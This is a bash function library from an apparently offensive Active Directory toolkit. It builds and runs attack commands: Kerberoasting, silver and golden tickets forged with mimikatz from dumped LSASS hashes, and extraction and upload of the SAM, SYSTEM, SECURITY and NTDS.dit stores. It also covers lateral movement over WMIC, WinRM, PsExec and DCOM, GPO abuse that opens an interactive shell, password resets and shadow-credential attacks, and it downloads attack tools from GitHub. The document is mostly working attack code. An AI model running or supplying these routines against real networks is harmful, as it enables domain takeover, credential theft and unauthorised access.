#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/password_cracking.sh"
source "$SCRIPTDIR/impacket.sh"
source "$SCRIPTDIR/mimikatz.sh"
source "$SCRIPTDIR/hashcat.sh"

download_spray_passwords() {
    if [[ ! -f "Spray-Passwords.ps1" ]]; then
        cp $SCRIPTDIR/../ps1/Spray-Passwords.ps1 Spray-Passwords.ps1
    fi
    generate_windows_download Spray-Passwords.ps1

}

download_kerbrute() {
    local kerbrute_url="https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe"
    if [[ ! -f "kerbrute_windows_amd64.exe" ]]; then
        wget "$kerbrute_url" -O kerbrute_windows_amd64.exe >> $trail_log
    fi
    generate_windows_download kerbrute_windows_amd64.exe
}

download_crackmapexec_windows() {
    local crackmapexec_url="https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/cme-windows-latest-3.10.1.zip"
    if [[ ! -f "cme-windows-latest-3.10.1.zip" ]]; then
        wget "$crackmapexec_url" -O cme-windows-latest-3.10.1.zip >> $trail_log
    fi
    if [[ ! -f "cme.exe" ]]; then
        unzip cme-windows-latest-3.10.1.zip >> $trail_log
        mv cme cme.exe
    fi
    generate_windows_download cme.exe
}

download_rubeus() {
    if [[ ! -f "Rubeus.exe" ]]; then
        #cp /usr/share/windows-resources/rubeus/Rubeus.exe .
        cp $SCRIPTDIR/../../tools/Rubeus/Rubeus/bin/Release/Rubeus.exe .
    fi
    generate_windows_download Rubeus.exe
}

perform_kerberoast_rubeus() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    download_rubeus
    echo '.\Rubeus.exe kerberoast /outfile:'$hash_file';'
    upload_file $hash_file
}

get_silverticket_command() {
    if [[ -z "$username" ]] || [[ -z "$domain" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, domain, and target IP/host address must be set before running SilverTicket command."
        return 1
    fi
    if [[ -z "$target_service" ]]; then
        target_service="http"
    fi
    if [[ -z "$mimikatz_log" ]]; then
        mimikatz_log="mimikatz_silverticket.log"
    fi
    echo '$sid = whoami /user | findstr '$username' | ForEach-Object {$parts = $_.Split('"' '"'); $parts[1]} | ForEach-Object {$last_index=$_.LastIndexOf('"'-'"'); $_.Substring(0,$last_index)}'
    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > '"$mimikatz_log"';'
    echo '$mimikatz_log = Get-Content '$mimikatz_log' -Raw;'
    echo '$matches = $mimikatz_log | Select-String -Pattern "(?s)iis_service.*?SHA1"'
    echo '$ntlm_hash = $matches.Matches.Value | findstr NTLM | ForEach-Object {$last_index=$_.LastIndexOf('"':'"'); $_.SubString($last_index+2)}'
    echo '$username = "'$username'"'
    echo '$domain = "'$domain'"'
    echo '$target = "'$target_hostname'"'
    echo '$target_service = "'$target_service'"'
    echo '.\mimikatz.exe "kerberos::golden /sid:$sid /domain:$domain /ptt /target:$target /service:$target_service /rc4:$ntlm_hash /user:$username" exit'

}


get_wmic_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local wmic_command="wmic /node:$target_ip /user:$username /password:$password process call create \"$cmd\""
    echo "$wmic_command"
}

get_wmic_powershell_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WMIC command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WMIC cmd is required."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='$options = New-CimSessionOption -Protocol DCOM;'
    powershell_commands+='$session = New-Cimsession -ComputerName '$target_ip' -Credential $credential -SessionOption $Options;'
    powershell_commands+='$command = '"'$cmd';"
    powershell_commands+='Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};'
    echo "$powershell_commands"

}

get_winrs_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "WinRM cmd is required."
        return 1
    fi
    local winrs_command="winrs -r:$target_ip -u:$username -p:$password \"$cmd\""
    echo "$winrs_command"
}

get_powershell_remoting_command() {
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, password, and target IP address must be set before running WinRM command."
        return 1
    fi
    local powershell_commands='$username = '"'$username';"
    powershell_commands+='$password = '"'$password';"
    powershell_commands+='$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;'
    powershell_commands+='$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;'
    powershell_commands+='New-PSSession -ComputerName '$target_ip' -Credential $credential;'
    powershell_commands+='Enter-PSSession 1'
    echo "$powershell_commands"
}

download_psexec() {
    local pstools_link="https://download.sysinternals.com/files/PSTools.zip"
    if [[ ! -f  "PSTools.zip" ]]; then
        wget "$pstools_link" -O PSTools.zip >> $trail_log
    fi
    if [[ -z "$PsExec_exe" ]]; then
        PsExec_exe="PsExec.exe"
    fi
    if [[ ! -d "pstools" ]]; then
        unzip -u PSTools.zip -d pstools >> $trail_log
    fi
    generate_windows_download "pstools/$PsExec_exe" "$PsExec_exe"
}

get_psexec_command() { 
    if [[ -z "$username" ]] || [[ -z "$password" ]] || [[ -z "$target_hostname" ]]; then
        echo "Username, password, and target hostname address must be set before running PsExec command."
        return 1
    fi
    echo '--- PSExec criteria ---'
    echo 'credentials must be part of local administrators group'
    echo 'ADMIN$ share must be enabled'
    echo 'File and Printer Sharing must be enabled'
    local psexec_username="$username"
    if [[ ! -z "$domain" ]]; then
        psexec_username="$domain\\$username"
    fi
    get_psexec
    local psexec_command=".\\$PsExec_exe -u $psexec_username -p $password -i \\\\$target_hostname cmd"
    echo "$psexec_command"

}

get_dcom_command() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP address must be set before running DCOM command."
        return 1
    fi
    if [[ -z "$cmd" ]]; then
        echo "DCOM cmd is required."
        return 1
    fi
    local powershell_command='$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","'$target_ip'"));'
    powershell_command+='$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c '$cmd'", "7")'
    echo "$powershell_command"   
}

get_golden_ticket_mimikatz() {
    target_username=krbtgt
    if ! get_ntlm_hash_from_mimikatz_log_lsadump; then
        echo "Failed to extract NTLM hash for $target_username."
        return 1
    fi
    if [[ -z "$domain_sid" ]]; then
        echo "Domain SID is not set, cannot create golden ticket."
        return 1
    fi
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash is not set, cannot create golden ticket."
        return 1
    fi
    get_mimikatz
    get_psexec
    echo '.\mimikatz.exe "kerberos::purge" exit'
    echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
}

get_perform_gpo_changeowner_windows_command() {
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$target_gpo" ]]; then
        echo "GPO owner username, password, and target IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running GPO abuse."
        return 1
    fi
    get_powerview
    echo "\$SecPassword = ConvertTo-SecureString '$gpo_owner_password' -AsPlainText -Force"
    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$gpo_owner_username', \$SecPassword)"
    echo "Set-DomainObjectOwner -Credential \$Cred -Identity '$target_gpo' -OwnerIdentity $domain\\$target_username"
}

perform_gpo_abuse_linux() {
    if [[ ! -d "gpo_abuse" ]]; then
        echo "Creating gpo_abuse directory..."
        mkdir -p "gpo_abuse"
    fi
    if [[ -z "$gpo_owner_username" ]] || [[ -z "$gpo_owner_password" ]] || [[ -z "$gpo_id" ]]; then
        echo "GPO owner username, password, and GPO id must be set before running GPO abuse."
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address must be set before running GPO abuse."
        return 1
    fi
    if [[ ! -d pyGPOAbuse ]]; then
        git clone https://github.com/Hackndo/pyGPOAbuse.git
    fi
    if [[ -z "$cmd" ]]; then
        echo "Command file already exists, skipping command generation."
    else
        echo $COMMONDIR/start_listener.sh $project $host_port interactive
        cmd=$(get_powershell_interactive_shell $host_port)
    fi
    pushd pyGPOAbuse || exit 1
    python3 pygpoabuse.py $domain/$gpo_owner_username:$gpo_owner_password -gpo-id $gpo_id -command "$cmd" -dc-ip $dc_ip -f
    popd || exit 1
}

perform_rbcd_linux() {
    if [[ -z "$controlled_computer_name" ]]; then
        echo "Controlled computer must be set before running RBCD."
        return 1
    fi
    if [[ -z "$controlled_computer_pass" ]]; then
        echo "Controlled computer password must be set before running RBCD."
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] ||  [[ -z "$password" ]]; then
        echo "Domain, username, password must be set before running RBCD."
        return 1
    fi
    if [[ -z "$target_system" ]]; then
        echo "Target system must be set before running RBCD."
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address must be set before running RBCD."
        return 1
    fi
    echo rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"

    rbcd.py -delegate-to "$target_system" -dc-ip "$dc_ip" -action read "$domain/$username:$password"
}
# WinRM runs on 5985 by default
run_evil_winrm() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP is not set. Please set it before running"
        return 1        
    fi
    local username_option=""
    if [[ -z "$username" ]]; then
        echo "Username is not set. Please set it before running"
        return 1        
    fi
    username_option="-u $username"
    local password_option=""
    if [[ -z "$password" ]] || [[ $password == "''" ]]; then
        echo "Password is not set. Ensure you are passing hashes"        
        if [[ -z "$ntlm_hash" ]]; then
            echo "NTLM hash is not set. Please set it before running"
            return 1
        else
            password_option="-H ${ntlm_hash^^}"
        fi  
    else
        password_option="-p '$password'"        
    fi
    if pgrep -f "evil-winrm -i $target_ip -u $username"; then
        echo "Evil-WinRM is already running for $target_ip, $username"
        return 0
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running evil-winrm with proxychains"
    else
        proxychain_command=""
    fi
    echo ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option"
    eval ${proxychain_command}evil-winrm -i "$target_ip" "$username_option" "$password_option" | tee >(remove_color_to_log >> $log_dir/evil_winrm_${target_ip}.log)

}   

target_kerberoast() {
    echo "Running Kerberoasting..."
    local url="https://github.com/ShutdownRepo/targetedKerberoast/archive/refs/heads/main.zip"
    local targetedKerberoast_dir="targetedKerberoast"
    if [[ ! -d $targetedKerberoast_dir ]]; then
        echo "Downloading targetedKerberoast..."
        wget -q -O "$targetedKerberoast_dir.zip" "$url"
        unzip -q "$targetedKerberoast_dir.zip"
        mv targetedKerberoast-main "$targetedKerberoast_dir"
        rm "$targetedKerberoast_dir.zip"
    fi
    if [[ -z "$target_user" ]]; then
        echo "Target user is not set. Please set it before running"
        return 1
    fi
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, password must be set before running"
        return 1
    fi
    if [[ -z "$dc_ip" ]]; then
        echo "DC IP address is not set. Please set it before running"
        return 1
    fi
    if [[ -z $hash_file ]]; then
        hash_file="hashes.$target_user"
    fi
    pushd "$targetedKerberoast_dir" || exit 1
    python3 targetedKerberoast.py -v -d "$domain" -u "$username" -p "$password" --dc-ip "$dc_ip" -o "$hash_file"
    popd || exit 1
    if [[ -f "$targetedKerberoast_dir/$hash_file" ]]; then
        cp -f "$targetedKerberoast_dir/$hash_file" .
    fi
}

get_regsave_commands() {

    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname must be set before running get_regsave_commands"
        return 1
    fi
    if [[ -z "$target_sam" ]]; then
        target_sam=$target_hostname.sam.hive
        echo "No target SAM provided, using default $target_sam"
    fi
    if [[ -z "$target_system" ]]; then
        target_system=$target_hostname.system.hive
        echo "No target SYSTEM provided, using default $target_system"
    fi
    echo "reg save hklm\system $target_system"
    echo "reg save hklm\sam $target_sam"
    upload_file $target_system
    upload_file $target_sam
    if [[ -z $target_security ]]; then
        target_security=$target_hostname.security.hive
        echo "No target SECURITY provided, using default $target_security"
    fi
    echo "reg save hklm\security $target_security"
    upload_file "$target_security"
 
}

get_ntdsutil_commands() {
    if [[ -z "$target_hostname" ]]; then
        echo "Target hostname must be set before running get_ntdsutil_commands"
        return 1
    fi
    if [[ -z "$target_system" ]]; then
        target_system=$target_hostname.system.hive
        echo "No target SYSTEM provided, using default $target_system"        
    fi
    if [[ -z "$target_ntds" ]]; then
        target_ntds=$target_hostname.ntds.dit
        echo "No target NTDS provided, using default $target_ntds"
    fi
    echo 'ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit;'
    upload_file "${target_ntds}" "c:\windows\temp\NTDS\Active Directory\ntds.dit"
    upload_file "${target_system}" "c:\windows\temp\NTDS\registry\SYSTEM"

}

enable_rdp_commands() {

    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /d 0 /t REG_DWORD;'
    echo 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f;'
}

#change password using powerview

change_password_powerview() {
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
        echo "You need to set the target username and password."
        return 1
    fi
    download_powerview
    echo "\$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force"
    echo "\$Cred = New-Object System.Management.Automation.PSCredential('$domain\\$username', \$SecPassword)"
    echo "\$UserPassword = ConvertTo-SecureString '$target_password' -AsPlainText -Force"
    echo "Set-DomainUserPassword -Identity $target_username -AccountPassword \$UserPassword -Credential \$Cred"
}

#change password using samba net

change_password_samba() {
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]] || [[ -z "$target_password" ]]; then
        echo "You need to set the target username and password."
        return 1
    fi
    if [[ -z "$dc_host" ]]; then
        echo "DC host is not set."
        return 1
    fi

    local samba_command="net rpc password '$target_username' '$target_password' -U '$domain\\$username%$password' -S '$dc_host'"
    echo "$samba_command"
    eval "$samba_command" | tee -a $log_dir/samba_password_change.log

}

#shadow credentials
#ca/pki needs to be setup to do this

perform_shadow_credentials() {
    local url="https://github.com/ShutdownRepo/pywhisker/archive/refs/heads/main.zip"
    local pywhisker_dir="pywhisker"
    if [[ ! -d $pywhisker_dir ]]; then
        echo "Downloading pywhisker..."
        wget -q -O "$pywhisker_dir.zip" "$url"
        unzip -q "$pywhisker_dir.zip"
        mv pywhisker-main "$pywhisker_dir"
        rm "$pywhisker_dir.zip"
    fi
    pywhisker_dir="$pywhisker_dir/pywhisker"
    if [[ -z "$domain" ]] || [[ -z "$username" ]] || [[ -z "$password" ]]; then
        echo "Domain, username, and password must be set before running"
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running"
        return 1
    fi
    pushd "$pywhisker_dir" || exit 1
    echo python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add"
    local result=$(python3 pywhisker.py -d "$domain" -u "$username" -p "$password" --target "'$target_username'" --action "add")
    local pfx_file=$(echo "$result" | grep -oP 'at path: \K.*')
    local pfx_password=$(echo "$result" | grep -oP 'with password: \K.*')
    popd || exit 1
    if [[ -z "$pfx_file" ]] || [[ -z "$pfx_password" ]]; then
        echo "Failed to retrieve PFX file or password."
        return 1
    fi    
    url="https://github.com/dirkjanm/PKINITtools/archive/refs/heads/master.zip"
    local pkinittools_dir="PKINITtools"
    if [[ ! -d $pkinittools_dir ]]; then
        echo "Downloading PKINITtools..."
        wget -q -O "$pkinittools_dir.zip" "$url"
        unzip -q "$pkinittools_dir.zip"
        mv PKINITtools-master "$pkinittools_dir"
        rm "$pkinittools_dir.zip"
    fi
    if [[ -z $ccache_file ]]; then
        ccache_file="${domain}_${target_username}.ccache"
    fi
    pushd "$pkinittools_dir" || exit 1
    python3 gettgtpkinit.py -cert-pfx ../$pywhisker_dir/$pfx_file -pfx-pass $pfx_password "$domain/$target_username" "$ccache_file"
    popd || exit 1
}
